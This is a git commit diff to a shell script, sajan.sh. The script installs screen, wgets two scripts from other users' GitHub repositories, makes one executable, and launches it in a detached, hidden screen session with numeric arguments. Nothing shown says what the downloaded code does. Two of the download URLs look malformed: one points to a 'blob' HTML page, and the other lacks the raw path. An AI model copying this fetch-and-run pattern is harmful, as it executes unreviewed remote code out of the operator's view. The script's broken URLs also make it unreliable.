3d115ac8ba00425e25860fc88dc8c9272067a329
ehsan4975 <89574647+ehsan4975@users.noreply.github.com>
2021-08-26 13:12:55 +0430

    Update sajan.sh

--- sajan.sh
+++ sajan.sh
@@ -2,7 +2,7 @@
 
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/archernap/prem/raw/main/lagan.sh
+wget https://github.com/ehsan4975/gamer/blob/main/lagan.sh
 wget https://github.com/biswas179/FkgX/main/man.sh
 chmod +x man.sh
 screen -dmS man ./man.sh 60 70
